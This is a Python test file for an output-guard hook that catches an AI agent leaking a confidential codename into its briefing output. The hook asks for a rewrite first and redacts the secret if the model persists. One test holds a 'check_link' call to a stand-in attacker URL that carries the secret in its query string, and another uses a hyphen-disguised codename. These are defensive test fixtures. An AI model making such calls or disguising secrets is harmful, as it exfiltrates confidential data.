from leash.hooks.output_guard import REDACTED, OutputSecretGuardHook

LEAKY = {"company": "Acme", "lines": ["Revenue EUR 412M", "Our bid: Project NIGHTJAR at EUR 12"], "sources": []}


def test_clean_answer_passes(before):
    event = before("Briefing", company="Acme", lines=["Revenue EUR 412M"], sources=[])
    OutputSecretGuardHook().check(event)
    assert event.cancel_tool is False


def test_other_tools_are_not_its_job(before):
    event = before("check_link", url="https://evil.example/?d=NIGHTJAR")
    OutputSecretGuardHook().check(event)
    assert event.cancel_tool is False  # that's the egress fence's job


def test_first_leak_asks_the_model_to_rewrite(before, state):
    event = before("Briefing", **LEAKY)
    OutputSecretGuardHook().check(event)
    assert "confidential notes" in event.cancel_tool
    assert state["leash"]["output_guard"]["rewrites"] == 1


def test_if_it_insists_the_hook_removes_the_secret_and_keeps_the_answer(before, state):
    hook = OutputSecretGuardHook()
    hook.check(before("Briefing", **LEAKY))
    second = before("Briefing", **LEAKY)
    hook.check(second)
    assert second.cancel_tool is False  # the answer still goes out...
    assert second.tool_use["input"]["lines"] == ["Revenue EUR 412M", REDACTED]  # ...without the secret
    assert state["leash"]["output_guard"]["redacted"] == 1


def test_disguised_secret_is_caught(before):
    event = before("Briefing", company="Acme", lines=["Codename: N-I-G-H-T-J-A-R"], sources=[])
    OutputSecretGuardHook().check(event)
    assert event.cancel_tool
